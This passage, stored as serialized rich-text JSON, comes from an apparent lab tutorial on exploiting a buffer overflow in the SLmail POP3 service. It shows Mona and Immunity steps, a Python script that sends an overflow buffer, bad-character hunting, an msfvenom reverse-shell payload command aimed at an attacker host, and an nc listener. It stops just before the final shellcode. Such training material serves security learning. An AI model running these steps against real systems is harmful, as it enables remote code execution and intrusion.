"}]},{"kind":"inline","type":"link","key":"57b384586d814e2ab56dcca2737c2c6d","isVoid":false,"data":{"href":"https://defuse.ca/online-x86-assembler.htm"},"nodes":[{"kind":"text","key":"a6ecdc12b6394e2eb8dc9f81401bb1ed","ranges":[{"kind":"range","marks":[],"text":"opcode"}]}]},{"kind":"text","key":"047cc0589495493c97d29df112c599ce","ranges":[{"kind":"range","marks":[],"text":", which is "},{"kind":"range","marks":[{"kind":"mark","data":{},"type":"code"}],"text":"FFE4"},{"kind":"range","marks":[],"text":" using Mona.py. Enter this command into the bottom text field:"}]}]},{"kind":"block","type":"paragraph","key":"fcbb925c35734467889f71a3678075cd","isVoid":false,"data":{},"nodes":[{"kind":"text","key":"9fa542d7145e4f57886829a72deb366a","ranges":[{"kind":"range","marks":[{"kind":"mark","data":{},"type":"code"}],"text":"!mona find -s “\\xff\\xe4″ -m slmfc.dll"}]}]},{"kind":"block","type":"image","key":"b67cee308bc34c698c9e7ac80585c8c3","isVoid":true,"data":{"assetID":"-LTik0qYbS-NSyYSlOcU","caption":"Find a JMP ESP command using its opcode FFE4"},"nodes":[{"kind":"text","key":"d80bad1d0ecc45e5ad4c69cae1d4e7b3","ranges":[{"kind":"range","marks":[],"text":""}]}]},{"kind":"block","type":"paragraph","key":"70199d106c1d4c97b6ae91b8d2156ef9","isVoid":false,"data":{},"nodes":[{"kind":"text","key":"0cdca16be6a34a96802fd94d9d8303ad","ranges":[{"kind":"range","marks":[],"text":"Record the memory address from the first result and "},{"kind":"range","marks":[{"kind":"mark","data":{},"type":"bold"}],"text":"flip it"},{"kind":"range","marks":[],"text":" because of little endian nonsense: "}]}]},{"kind":"block","type":"code","key":"25a952059c7a43cda4e9bc7e63b48e58","isVoid":false,"data":{"syntax":"text"},"nodes":[{"kind":"block","type":"code-line","key":"ae35c7e7c4804055b09be0a94b568161","isVoid":false,"data":{},"nodes":[{"kind":"text","key":"0d914627e7e144edb24ff55923f07722","ranges":[{"kind":"range","marks":[],"text":"5F 4A 35 8F         # Address retrieved from Mona results"}]}]},{"kind":"block","type":"code-line","key":"66a7cec6d0374c49bc260e273a7d5083","isVoid":false,"data":{},"nodes":[{"kind":"text","key":"83c603e03b244f3491ee6b1d38af06f5","ranges":[{"kind":"range","marks":[],"text":"\\x8f\\x35\\x4a\\x5f    # How it looks in your final exploit"}]}]}]},{"kind":"block","type":"paragraph","key":"3acbf7ba33a546119ccdf5a74deaf709","isVoid":false,"data":{},"nodes":[{"kind":"text","key":"80fb23a736a24294be889f14ffb24936","ranges":[{"kind":"range","marks":[],"text":"(here's a "}]},{"kind":"inline","type":"link","key":"c3a5755352e84202b11846b77b1cce0c","isVoid":false,"data":{"href":"https://stackoverflow.com/questions/16903192/meaning-of-0x-and-x-in-python-hex-strings"},"nodes":[{"kind":"text","key":"e11d78367af14e66ad3eb6db77bdce82","ranges":[{"kind":"range","marks":[],"text":"quick explanation"}]}]},{"kind":"text","key":"d1efeeb4acf04b08a42e99f347d6a4ef","ranges":[{"kind":"range","marks":[],"text":" of the "},{"kind":"range","marks":[{"kind":"mark","data":{},"type":"code"}],"text":"\\x"},{"kind":"range","marks":[],"text":" and "},{"kind":"range","marks":[{"kind":"mark","data":{},"type":"code"}],"text":"0x"},{"kind":"range","marks":[],"text":" stuff you see around hex codes)"}]}]},{"kind":"block","type":"heading-2","key":"bd0e6ed62d2943e49b0cd6d74122e7ec","isVoid":false,"data":{},"nodes":[{"kind":"text","key":"00a5a0fd2c9f4f7ea6ba5215c9784ba1","ranges":[{"kind":"range","marks":[{"kind":"mark","data":{},"type":"bold"}],"text":"Make shellcode"}]}]},{"kind":"block","type":"paragraph","key":"6ece7d1887c44f05986f183178200066","isVoid":false,"data":{},"nodes":[{"kind":"text","key":"92ba6ef8fef147bebdc4b6b9197a181b","ranges":[{"kind":"range","marks":[],"text":"Now that we've built the first part of our exploit, we can prepare some malicious shellcode that can be successfully executed by the program."}]}]},{"kind":"block","type":"paragraph","key":"2e460196a4d74c2ea3bd58bcddfe972f","isVoid":false,"data":{},"nodes":[{"kind":"text","key":"18029e0652e44cb884ed1804fa65416c","ranges":[{"kind":"range","marks":[],"text":"In order to run, the shellcode can't contain characters that will be interpreted incorrectly by the program you are exploiting (such as newline). These can be identified by overflowing the buffer until the EIP is overwritten, then inserting the "}]},{"kind":"inline","type":"link","key":"bf7dfe46023b43aab9951c2a9349ff46","isVoid":false,"data":{"href":"https://www.rapidtables.com/code/text/ascii-table.html"},"nodes":[{"kind":"text","key":"2943f0d24d4b4a29855e07d72d00f6c4","ranges":[{"kind":"range","marks":[],"text":"hex representation of all ASCII characters"}]}]},{"kind":"text","key":"cfae4d12479b4e7386fa75712335b5e6","ranges":[{"kind":"range","marks":[],"text":":"}]}]},{"kind":"block","type":"code","key":"7712582793864fd79ed4483f7c3b4598","isVoid":false,"data":{"syntax":"python"},"nodes":[{"kind":"block","type":"code-line","key":"039b0c9675d64ebbb65dc36ab5d1561d","isVoid":false,"data":{},"nodes":[{"kind":"text","key":"d7d2ffc4744c4ef1b44f43b562815801","ranges":[{"kind":"range","marks":[],"text":"#!/usr/bin/python"}]}]},{"kind":"block","type":"code-line","key":"397de34e1bdd4862926f78368b4efcec","isVoid":false,"data":{},"nodes":[{"kind":"text","key":"ee59ee96656e4907bd9c6a0cad279ed8","ranges":[{"kind":"range","marks":[],"text":""}]}]},{"kind":"block","type":"code-line","key":"8b94512ce17f46aa91648b7e4557c146","isVoid":false,"data":{},"nodes":[{"kind":"text","key":"297d366b4b244487b0fc50c751c19226","ranges":[{"kind":"range","marks":[],"text":"import socket"}]}]},{"kind":"block","type":"code-line","key":"bd1e7e417b3a4c99a6bb105522512dd8","isVoid":false,"data":{},"nodes":[{"kind":"text","key":"626072109b764fc3a7e1d90b8970488f","ranges":[{"kind":"range","marks":[],"text":""}]}]},{"kind":"block","type":"code-line","key":"eb9e8c57e98b4830856660e12d3dc944","isVoid":false,"data":{},"nodes":[{"kind":"text","key":"43a072f2062044e1a4d06627f5ad67d5","ranges":[{"kind":"range","marks":[],"text":"s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)"}]}]},{"kind":"block","type":"code-line","key":"27bbcd29f0654b1fa671a0620d20d85a","isVoid":false,"data":{},"nodes":[{"kind":"text","key":"3c18725c234542d6b71369fa15672328","ranges":[{"kind":"range","marks":[],"text":""}]}]},{"kind":"block","type":"code-line","key":"fc54dcbbc7044f848af324851b40706e","isVoid":false,"data":{},"nodes":[{"kind":"text","key":"0403f757035e4976b6e0a38d58378f13","ranges":[{"kind":"range","marks":[],"text":"# Create a variable to hold all ASCII characters "}]}]},{"kind":"block","type":"code-line","key":"654b597469e74b179349bdbc11b8d292","isVoid":false,"data":{},"nodes":[{"kind":"text","key":"dd0ebefebca64b56a545cb179df4fc5a","ranges":[{"kind":"range","marks":[],"text":"badchars = ("}]}]},{"kind":"block","type":"code-line","key":"d18e85cc88fe41d6b624cfa1fedc119a","isVoid":false,"data":{},"nodes":[{"kind":"text","key":"383282e7d4b74ad0a8f2c9ce8a09c3c0","ranges":[{"kind":"range","marks":[],"text":"\"\\x01\\x02\\x03\\x04\\x05\\x06\\x07\\x08\\x09\\x0a\\x0b\\x0c\\x0d\\x0e\\x0f\\x10\""}]}]},{"kind":"block","type":"code-line","key":"6ea54cd5e231448c805167099c70e2a2","isVoid":false,"data":{},"nodes":[{"kind":"text","key":"330685c41c6e4fe5afdf668826db882b","ranges":[{"kind":"range","marks":[],"text":"\"\\x11\\x12\\x13\\x14\\x15\\x16\\x17\\x18\\x19\\x1a\\x1b\\x1c\\x1d\\x1e\\x1f\\x20\""}]}]},{"kind":"block","type":"code-line","key":"ab14b081df7841f2aaba6b9db1889246","isVoid":false,"data":{},"nodes":[{"kind":"text","key":"cdae50cc7cd545f698f1f5642dad20a5","ranges":[{"kind":"range","marks":[],"text":"\"\\x21\\x22\\x23\\x24\\x25\\x26\\x27\\x28\\x29\\x2a\\x2b\\x2c\\x2d\\x2e\\x2f\\x30\""}]}]},{"kind":"block","type":"code-line","key":"09105a4f568a4a83bdb75ee35e59524c","isVoid":false,"data":{},"nodes":[{"kind":"text","key":"83d79487099945aea79d379e6de23ebb","ranges":[{"kind":"range","marks":[],"text":"\"\\x31\\x32\\x33\\x34\\x35\\x36\\x37\\x38\\x39\\x3a\\x3b\\x3c\\x3d\\x3e\\x3f\\x40\""}]}]},{"kind":"block","type":"code-line","key":"98cb7449d7a04b88821d00a15e919bf1","isVoid":false,"data":{},"nodes":[{"kind":"text","key":"7b4f12db70d948b8a74e72a5c8336324","ranges":[{"kind":"range","marks":[],"text":"\"\\x41\\x42\\x43\\x44\\x45\\x46\\x47\\x48\\x49\\x4a\\x4b\\x4c\\x4d\\x4e\\x4f\\x50\""}]}]},{"kind":"block","type":"code-line","key":"1da4699c1b574263b7c11ac11c979c58","isVoid":false,"data":{},"nodes":[{"kind":"text","key":"4e2f08614b85418f96d38554f1b64c20","ranges":[{"kind":"range","marks":[],"text":"\"\\x51\\x52\\x53\\x54\\x55\\x56\\x57\\x58\\x59\\x5a\\x5b\\x5c\\x5d\\x5e\\x5f\\x60\""}]}]},{"kind":"block","type":"code-line","key":"13756d8e23834686af512fc2e33f209c","isVoid":false,"data":{},"nodes":[{"kind":"text","key":"56547cc46e1d495a84a3f253bb4011bc","ranges":[{"kind":"range","marks":[],"text":"\"\\x61\\x62\\x63\\x64\\x65\\x66\\x67\\x68\\x69\\x6a\\x6b\\x6c\\x6d\\x6e\\x6f\\x70\""}]}]},{"kind":"block","type":"code-line","key":"50fb6b6399ca47699287e35bc1a16e96","isVoid":false,"data":{},"nodes":[{"kind":"text","key":"7cd0f37b81ce4040bbd88ee23e717ec9","ranges":[{"kind":"range","marks":[],"text":"\"\\x71\\x72\\x73\\x74\\x75\\x76\\x77\\x78\\x79\\x7a\\x7b\\x7c\\x7d\\x7e\\x7f\\x80\""}]}]},{"kind":"block","type":"code-line","key":"df95a5337b254ac0ad4a99ccfb438f06","isVoid":false,"data":{},"nodes":[{"kind":"text","key":"710757e6f4e2488c828df22b665b683f","ranges":[{"kind":"range","marks":[],"text":"\"\\x81\\x82\\x83\\x84\\x85\\x86\\x87\\x88\\x89\\x8a\\x8b\\x8c\\x8d\\x8e\\x8f\\x90\""}]}]},{"kind":"block","type":"code-line","key":"115b3fa2e1f24daea01b14264733a583","isVoid":false,"data":{},"nodes":[{"kind":"text","key":"71ab741ae78f4b5a82a75e3d9b59eb0c","ranges":[{"kind":"range","marks":[],"text":"\"\\x91\\x92\\x93\\x94\\x95\\x96\\x97\\x98\\x99\\x9a\\x9b\\x9c\\x9d\\x9e\\x9f\\xa0\""}]}]},{"kind":"block","type":"code-line","key":"e00d4ce8b1b74fa68394148b6ed9e226","isVoid":false,"data":{},"nodes":[{"kind":"text","key":"4fca65d2022d43dc8c944669bb6ceaf9","ranges":[{"kind":"range","marks":[],"text":"\"\\xa1\\xa2\\xa3\\xa4\\xa5\\xa6\\xa7\\xa8\\xa9\\xaa\\xab\\xac\\xad\\xae\\xaf\\xb0\""}]}]},{"kind":"block","type":"code-line","key":"c9acebf9a49342e7881a6e6fdd752612","isVoid":false,"data":{},"nodes":[{"kind":"text","key":"11b87fa5b34247d384895fbdc1ff8981","ranges":[{"kind":"range","marks":[],"text":"\"\\xb1\\xb2\\xb3\\xb4\\xb5\\xb6\\xb7\\xb8\\xb9\\xba\\xbb\\xbc\\xbd\\xbe\\xbf\\xc0\""}]}]},{"kind":"block","type":"code-line","key":"d12494c1ef814c0a845dd49e00c4019a","isVoid":false,"data":{},"nodes":[{"kind":"text","key":"3d1f28479e094aa0beb83f49cfde9b4e","ranges":[{"kind":"range","marks":[],"text":"\"\\xc1\\xc2\\xc3\\xc4\\xc5\\xc6\\xc7\\xc8\\xc9\\xca\\xcb\\xcc\\xcd\\xce\\xcf\\xd0\""}]}]},{"kind":"block","type":"code-line","key":"78b13058b5c84fa7951d77ab03123432","isVoid":false,"data":{},"nodes":[{"kind":"text","key":"6c038a9d2d3c48748e71937198f6f658","ranges":[{"kind":"range","marks":[],"text":"\"\\xd1\\xd2\\xd3\\xd4\\xd5\\xd6\\xd7\\xd8\\xd9\\xda\\xdb\\xdc\\xdd\\xde\\xdf\\xe0\""}]}]},{"kind":"block","type":"code-line","key":"a5b82228bbdf4b4c856ed4726c6261bf","isVoid":false,"data":{},"nodes":[{"kind":"text","key":"14d762e502b7498ca3fb02533216d08c","ranges":[{"kind":"range","marks":[],"text":"\"\\xe1\\xe2\\xe3\\xe4\\xe5\\xe6\\xe7\\xe8\\xe9\\xea\\xeb\\xec\\xed\\xee\\xef\\xf0\""}]}]},{"kind":"block","type":"code-line","key":"932fece66f2343d3bf0a8f2412bd1ada","isVoid":false,"data":{},"nodes":[{"kind":"text","key":"b63bdf3dace44957991b0376328a4304","ranges":[{"kind":"range","marks":[],"text":"\"\\xf1\\xf2\\xf3\\xf4\\xf5\\xf6\\xf7\\xf8\\xf9\\xfa\\xfb\\xfc\\xfd\\xfe\\xff\" )"}]}]},{"kind":"block","type":"code-line","key":"9123ac4daa584465abad4e4690682f0a","isVoid":false,"data":{},"nodes":[{"kind":"text","key":"71c2a0a837e347ff8dd57121722f3505","ranges":[{"kind":"range","marks":[],"text":""}]}]},{"kind":"block","type":"code-line","key":"da17218e9e384dcd88745f4644644179","isVoid":false,"data":{},"nodes":[{"kind":"text","key":"b09a2b4a55c14f9b942c74201513355e","ranges":[{"kind":"range","marks":[],"text":"# Create a buffer of 2606 As, 4 Bs and the ASCII characters"}]}]},{"kind":"block","type":"code-line","key":"6a2be46b0c3d47dd942684014ba622b9","isVoid":false,"data":{},"nodes":[{"kind":"text","key":"fbcf836706534db984e889a66fa0680c","ranges":[{"kind":"range","marks":[],"text":"buffer= \"A\" * 2606 + \"B\" * 4 + badchars"}]}]},{"kind":"block","type":"code-line","key":"75a8adeb875246f2b1dba100a0e1381b","isVoid":false,"data":{},"nodes":[{"kind":"text","key":"36d494e5229b4a1a81b47278c3186c05","ranges":[{"kind":"range","marks":[],"text":""}]}]},{"kind":"block","type":"code-line","key":"8ca564ef45a84bfcaca25e8899c21de7","isVoid":false,"data":{},"nodes":[{"kind":"text","key":"0bd266ff36ed45b6b3bd04b7de55e023","ranges":[{"kind":"range","marks":[],"text":"try: "}]}]},{"kind":"block","type":"code-line","key":"1726732b0cec4bc8b119e09ad6afbdff","isVoid":false,"data":{},"nodes":[{"kind":"text","key":"ceae7848f12042658ebdf6bb5ba4f4c9","ranges":[{"kind":"range","marks":[],"text":"    print \"\\nSending buffer...\""}]}]},{"kind":"block","type":"code-line","key":"5cae6ae46e804cec8dc18ae82c938823","isVoid":false,"data":{},"nodes":[{"kind":"text","key":"f7dbd10027dd42adbb92c0f7c5407b39","ranges":[{"kind":"range","marks":[],"text":"# Connect to Windows 7 machine, POP3 service    "}]}]},{"kind":"block","type":"code-line","key":"ca938e7b7e2e46a396abccec76b3f03b","isVoid":false,"data":{},"nodes":[{"kind":"text","key":"ee3edaf2b55c45c3a2fafee1e68d8194","ranges":[{"kind":"range","marks":[],"text":"    s.connect(('10.0.0.1',110))"}]}]},{"kind":"block","type":"code-line","key":"4172a49a840a4c6aa4f17324b3a7e2fa","isVoid":false,"data":{},"nodes":[{"kind":"text","key":"0d7db94b70324aa2a9b5fa04b8ed5ec8","ranges":[{"kind":"range","marks":[],"text":"    data = s.recv(1024)"}]}]},{"kind":"block","type":"code-line","key":"c866baa35531406d8f849c59e68d4f4a","isVoid":false,"data":{},"nodes":[{"kind":"text","key":"257076c1288e4b86bb83370adc6d485a","ranges":[{"kind":"range","marks":[],"text":"    s.send('USER username' + '\\r\\n')"}]}]},{"kind":"block","type":"code-line","key":"dfb8293b9d6f493ebb53805a32481906","isVoid":false,"data":{},"nodes":[{"kind":"text","key":"8b7e6ff14fdb44cf805bb131b88663c8","ranges":[{"kind":"range","marks":[],"text":"    data = s.recv(1024)"}]}]},{"kind":"block","type":"code-line","key":"dd7b86ce6ca641a3b207ba38ff48be30","isVoid":false,"data":{},"nodes":[{"kind":"text","key":"8e16df14b0624f408cf1d9a17f671300","ranges":[{"kind":"range","marks":[],"text":"    s.send('PASS ' + buffer + '\\r\\n')"}]}]},{"kind":"block","type":"code-line","key":"0936fa80af9947be971365c31ea83e28","isVoid":false,"data":{},"nodes":[{"kind":"text","key":"2044c4913b954434b7ff4321b108afee","ranges":[{"kind":"range","marks":[],"text":"    print \"\\nDone!\""}]}]},{"kind":"block","type":"code-line","key":"d4cfc4b7ef03488ba450ff1125104fb5","isVoid":false,"data":{},"nodes":[{"kind":"text","key":"c11ab6bd843f47e1914da9bfd4c2edce","ranges":[{"kind":"range","marks":[],"text":""}]}]},{"kind":"block","type":"code-line","key":"320e62297df24222912728d4f7b344bb","isVoid":false,"data":{},"nodes":[{"kind":"text","key":"e68af68818e54cff8cc57f2dfd37cfdb","ranges":[{"kind":"range","marks":[],"text":"except:"}]}]},{"kind":"block","type":"code-line","key":"154464566767402bb770c1df162863c7","isVoid":false,"data":{},"nodes":[{"kind":"text","key":"5f23c8c7ceaa46e293af40b657800c3b","ranges":[{"kind":"range","marks":[],"text":"    print \"Could not connect!\""}]}]}]},{"kind":"block","type":"paragraph","key":"9afaad5a557b4c24a3fe204ecc0bac5f","isVoid":false,"data":{},"nodes":[{"kind":"text","key":"63e41eb3742f421f849f10fb2d249771","ranges":[{"kind":"range","marks":[],"text":"Note: The ASCII character "},{"kind":"range","marks":[{"kind":"mark","data":{},"type":"code"}],"text":"\\x00"},{"kind":"range","marks":[],"text":" is left out because it's a null byte, which immediately terminates the remainder of the shellcode. It's always a bad character."}]}]},{"kind":"block","type":"paragraph","key":"9633a31bad354504a6868f0065419d32","isVoid":false,"data":{},"nodes":[{"kind":"text","key":"8b6c33d88d5f4cb4a2ed28f29c811b0f","ranges":[{"kind":"range","marks":[],"text":"Start the SLmail POP3 service, attach it to Immunity Debugger and run your Python script. You'll notice that the EIP has been overwritten with "},{"kind":"range","marks":[{"kind":"mark","data":{},"type":"code"}],"text":"42424242"},{"kind":"range","marks":[],"text":" (the 4 Bs you added to the buffer after the 2606 As)."}]}]},{"kind":"block","type":"paragraph","key":"466b551a1b6247168a6a2322a1924a13","isVoid":false,"data":{},"nodes":[{"kind":"text","key":"df871196b4894c1ebffaaa764b5fb464","ranges":[{"kind":"range","marks":[],"text":"The next step is to find your buffer string in the dump. In the Registers area of Immunity, click on the memory address where the string of As went in (ECX), then right-click and choose "},{"kind":"range","marks":[{"kind":"mark","data":{},"type":"code"}],"text":"Follow in Dump"},{"kind":"range","marks":[],"text":".  The dump area will change and show your buffer string: "}]}]},{"kind":"block","type":"image","key":"639595175ca64a829e84e56a4f5fa407","isVoid":true,"data":{"assetID":"-LTYmN7Gy_M-eOaZ04XD","caption":"Finding your buffer string in the dump"},"nodes":[{"kind":"text","key":"6f65e07e82594287b4ed1af114f1ed23","ranges":[{"kind":"range","marks":[],"text":""}]}]},{"kind":"block","type":"paragraph","key":"6eabd27cd11e4ed49f13999d1c6057ed","isVoid":false,"data":{},"nodes":[{"kind":"text","key":"564d0e4e672d43b8a8c013b20b720456","ranges":[{"kind":"range","marks":[],"text":"You'll notice that the ASCII sequence displays normally at first, but instead of showing "},{"kind":"range","marks":[{"kind":"mark","data":{},"type":"code"}],"text":"0A"},{"kind":"range","marks":[],"text":" next it shows "},{"kind":"range","marks":[{"kind":"mark","data":{},"type":"code"}],"text":"29"},{"kind":"range","marks":[],"text":". That means "},{"kind":"range","marks":[{"kind":"mark","data":{},"type":"code"}],"text":"\\x0a"},{"kind":"range","marks":[],"text":" is a bad character:"}]}]},{"kind":"block","type":"code","key":"b0cdb6aa2f7b4f1b9f5368295e040d21","isVoid":false,"data":{"syntax":"text"},"nodes":[{"kind":"block","type":"code-line","key":"8e93981b68ac45afa6e878afb31947d9","isVoid":false,"data":{},"nodes":[{"kind":"text","key":"7b076248b46a4e5da6316260fdd0729c","ranges":[{"kind":"range","marks":[],"text":"\\x01\\x02\\x03\\x04\\x05\\x06\\x07\\x08\\x09\\x0a # ASCII sequence in python script"}]}]},{"kind":"block","type":"code-line","key":"41de3e5d69874a1da45320f47ab21c21","isVoid":false,"data":{},"nodes":[{"kind":"text","key":"e0412f3932b04d8aa53b8c40c495b364","ranges":[{"kind":"range","marks":[],"text":"01 02 03 04 05 06 07 08 09 29            # Hex dump in Immunity"}]}]},{"kind":"block","type":"code-line","key":"b142aab060494649a3be2fb216d118a7","isVoid":false,"data":{},"nodes":[{"kind":"text","key":"c39d47cd9170419b8e1c41a54279b9ae","ranges":[{"kind":"range","marks":[],"text":""}]}]}]},{"kind":"block","type":"paragraph","key":"5995d117ae5c4b89a3c220dacb8e2a60","isVoid":false,"data":{},"nodes":[{"kind":"text","key":"4877c2d4237d4fdab54c921c52c2c8ab","ranges":[{"kind":"range","marks":[],"text":"Remove it from your python script and run it again, following the dump to find the next bad character. As you can see, the sequence proceeds (without the"},{"kind":"range","marks":[{"kind":"mark","data":{},"type":"code"}],"text":"0A"},{"kind":"range","marks":[],"text":") until we expect to see "},{"kind":"range","marks":[{"kind":"mark","data":{},"type":"code"}],"text":"0D"},{"kind":"range","marks":[],"text":" but it's missing. That means "},{"kind":"range","marks":[{"kind":"mark","data":{},"type":"code"}],"text":"\\x0d"},{"kind":"range","marks":[],"text":" is a bad character:"}]}]},{"kind":"block","type":"image","key":"3e64fb1a698b436b9adcd38d3ce1cb25","isVoid":true,"data":{"assetID":"-LTYrBNq57LM9XWavXjT","caption":"Finding the next bad character"},"nodes":[{"kind":"text","key":"7935539adea84aeaa5891b64c1436d39","ranges":[{"kind":"range","marks":[],"text":""}]}]},{"kind":"block","type":"paragraph","key":"690059b19e144663b69bee141e80dfe3","isVoid":false,"data":{},"nodes":[{"kind":"text","key":"faa6af7813d641309a370d3e60f99308","ranges":[{"kind":"range","marks":[],"text":"I bet you're really hating yourself now, having to pick through a bunch of microscopic letters looking for errors. Suck it up, remove the "},{"kind":"range","marks":[{"kind":"mark","data":{},"type":"code"}],"text":"\\x0d"},{"kind":"range","marks":[],"text":" from your python script and run it again. You should see your entire sequence of ASCII characters with no further errors:"}]}]},{"kind":"block","type":"image","key":"b932bbe9bf094323a98c98895ed7edbd","isVoid":true,"data":{"assetID":"-LTYtbuTMhfSsxCCuSBv","caption":"All bad characters removed"},"nodes":[{"kind":"text","key":"9559d3f7d8f249d4b2c35850cb68a4b5","ranges":[{"kind":"range","marks":[],"text":""}]}]},{"kind":"block","type":"paragraph","key":"5dbce210fd97498f8e07de800298b1d2","isVoid":false,"data":{},"nodes":[{"kind":"text","key":"e841237f78324684afb1879d7874b0e1","ranges":[{"kind":"range","marks":[],"text":"Now we know that there are 3 bad characters which should be removed from our shellcode: "},{"kind":"range","marks":[{"kind":"mark","data":{},"type":"code"}],"text":"\\x00 \\x0a \\x0d"},{"kind":"range","marks":[],"text":". Generate your shellcode using this msfvenom command:"}]}]},{"kind":"block","type":"paragraph","key":"3099ffc1574440bdb4e3bd5b784d7ad8","isVoid":false,"data":{},"nodes":[{"kind":"text","key":"b7d74586deba4bb38d6b21484b9eb034","ranges":[{"kind":"range","marks":[{"kind":"mark","data":{},"type":"code"}],"text":"msfvenom -p windows/shell_reverse_tcp LHOST=[attack machine IP] LPORT=443 -f c -a x86 --platform windows -b \"\\x00\\x0A\\x0D\" -e x86/shikata_ga_nai"}]}]},{"kind":"block","type":"paragraph","key":"695006d593ea4aecb7559e3dc11a89fa","isVoid":false,"data":{},"nodes":[{"kind":"text","key":"bb16884b71d043cea163e5afbf0d96e8","ranges":[{"kind":"range","marks":[],"text":"The "},{"kind":"range","marks":[{"kind":"mark","data":{},"type":"code"}],"text":"-b"},{"kind":"range","marks":[],"text":" option is where you identify the bad characters. Copy the output and keep it somewhere safe until the final step. "}]}]},{"kind":"block","type":"heading-2","key":"316b62aaa4bc4af79205d65f587c95cb","isVoid":false,"data":{},"nodes":[{"kind":"text","key":"f9f8dfee8d434774aa6a89b7153d25f4","ranges":[{"kind":"range","marks":[],"text":"Assemble the exploit"}]}]},{"kind":"block","type":"paragraph","key":"8a33123a693b42548bdab595776c5c9b","isVoid":false,"data":{},"nodes":[{"kind":"text","key":"1907f5a0930247a7ba2d125323c6fb81","ranges":[{"kind":"range","marks":[],"text":"It's time to put together your fancy cake:"}]}]},{"kind":"block","type":"list-unordered","key":"ff2b1f40f68844c7ac9dc44d91545d77","isVoid":false,"data":{},"nodes":[{"kind":"block","type":"list-item","key":"07af7520539844d39d9c4e2c8cf834b7","isVoid":false,"data":{},"nodes":[{"kind":"block","type":"paragraph","key":"c0c0660fe8b14ba3a84c7e9d26ffc63d","isVoid":false,"data":{},"nodes":[{"kind":"text","key":"4201d0a0f58741f496de459f749fc8fb","ranges":[{"kind":"range","marks":[],"text":"2606 As (to hit the EIP)"}]}]}]},{"kind":"block","type":"list-item","key":"7f288a2ac8cb4f74a2c8db9aecc8860c","isVoid":false,"data":{},"nodes":[{"kind":"block","type":"paragraph","key":"2c0d32accb224439810fd8be65394b8c","isVoid":false,"data":{},"nodes":[{"kind":"text","key":"c63a2c8f66784d248e0c57f64a2abe47","ranges":[{"kind":"range","marks":[{"kind":"mark","data":{},"type":"code"}],"text":"JMP ESP"},{"kind":"range","marks":[],"text":" memory address put in "},{"kind":"range","marks":[{"kind":"mark","data":{},"type":"bold"}],"text":"backwards"},{"kind":"range","marks":[],"text":" (overwrite EIP and redirect execution)"}]}]}]},{"kind":"block","type":"list-item","key":"7e6bbd1cea60442281ad8c4a4413a789","isVoid":false,"data":{},"nodes":[{"kind":"block","type":"paragraph","key":"c6d666fa0e4844f09b2c584fcf191bfc","isVoid":false,"data":{},"nodes":[{"kind":"text","key":"169c246d55d54a929af1c67f1c2e47a3","ranges":[{"kind":"range","marks":[],"text":"16 nops (breathing room)"}]}]}]},{"kind":"block","type":"list-item","key":"477a4028ef3c413ab816c1c5d3d2d924","isVoid":false,"data":{},"nodes":[{"kind":"block","type":"paragraph","key":"67ef06782e8d410787ad32ce74bf4662","isVoid":false,"data":{},"nodes":[{"kind":"text","key":"d0849ee654a9468eb0c86301e8ecf034","ranges":[{"kind":"range","marks":[],"text":"Shellcode (sends you a shell)"}]}]}]}]},{"kind":"block","type":"paragraph","key":"c5bb2f7cef7b47a69b5414180447d714","isVoid":false,"data":{},"nodes":[{"kind":"text","key":"866c5effa7744823ac9dc1da569138fa","ranges":[{"kind":"range","marks":[],"text":"As mentioned before, a nopsled is useful if you don't know the exact location of the ESP and want to \"slide\" into your shellcode, or if you want to prevent the Metasploit decoder at the beginning of your payload from "}]},{"kind":"inline","type":"link","key":"8af71551befd4365bccafaf856cd928a","isVoid":false,"data":{"href":"https://security.stackexchange.com/a/169622"},"nodes":[{"kind":"text","key":"56fc0491224c4fdaacafc96803827bc3","ranges":[{"kind":"range","marks":[],"text":"overwriting the shellcode"}]}]},{"kind":"text","key":"1810a3eb5bbc40e4b0aafb3e76b52df8","ranges":[{"kind":"range","marks":[],"text":". "}]}]},{"kind":"block","type":"paragraph","key":"efdb1efb70e7420fa05398c7f9bbea34","isVoid":false,"data":{},"nodes":[{"kind":"text","key":"e28bb5ff19d140ac8a6c556ef943b131","ranges":[{"kind":"range","marks":[],"text":"Remember to set up a listener on your Kali machine: "}]}]},{"kind":"block","type":"paragraph","key":"2e9de6d2e44040ac87ff76d152de3312","isVoid":false,"data":{},"nodes":[{"kind":"text","key":"66332d63d736449e805cf479c0578b7f","ranges":[{"kind":"range","marks":[{"kind":"mark","data":{},"type":"code"}],"text":"nc -nlvp 443"}]}]},{"kind":"block","type":"paragraph","key":"1404580f80e34175b0298eaccfde939d","isVoid":false,"data":{},"nodes":[{"kind":"text","key":"e79414f1c6dd494a85320224f2d2e936","ranges":[{"kind":"range","marks":[],"text":"Then run your exploit:"}]}]},{"kind":"block","type":"code","key":"64a77e685e7443e094f073cd60e1d771","isVoid":false,"data":{"syntax":"python"},"nodes":[{"kind":"block","type":"code-line","key":"00ca82315a444471a4f2f4512a2bf28d","isVoid":false,"data":{},"nodes":[{"kind":"text","key":"c9d1a948b46d480e93a47645d80026a6","ranges":[{"kind":"range","marks":[],"text":"#!/usr/bin/python"}]}]},{"kind":"block","type":"code-line","key":"267db9fa8be148b5b918e13862b522a6","isVoid":false,"data":{},"nodes":[{"kind":"text","key":"6c4443d3ab9d42cda87044016661c2ec","ranges":[{"kind":"range","marks":[],"text":""}]}]},{"kind":"block","type":"code-line","key":"30e67f615ba24ddcbdb8be4cda6bd7eb","isVoid":false,"data":{},"nodes":[{"kind":"text","key":"cd9377c600ef4398928dbc43d2a230ce","ranges":[{"kind":"range","marks":[],"text":"import socket"}]}]},{"kind":"block","type":"code-line","key":"072482dc95fa48c3ba5da8c7a7893225","isVoid":false,"data":{},"nodes":[{"kind":"text","key":"71e80f68494248df818677a050ef277e","ranges":[{"kind":"range","marks":[],"text":""}]}]},{"kind":"block","type":"code-line","key":"61f055c6d0cb43d4be71b023abf4bf9d","isVoid":false,"data":{},"nodes":[{"kind":"text","key":"1ad4686d04e74eab9a99648cd77c73fd","ranges":[{"kind":"range","marks":[],"text":"s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)"}]}]},{"kind":"block","type":"code-line","key":"8f293af265ec4645a506243ef64892da","isVoid":false,"data":{},"nodes":[{"kind":"text","key":"00942a4a44e0494eae22e3370d1e8cf5","ranges":[{"kind":"range","marks":[],"text":""}]}]},{"kind":"block","type":"code-line","key":"92fdf2fd4f544d46af1dbcc6fe9cb8a8","isVoid":false,"data":{},"nodes":[{"kind":"text","key":"6e71964323194ba8b6b09c603ff44ca5","ranges":[{"kind":"range","marks":[],"text":"shellcode = 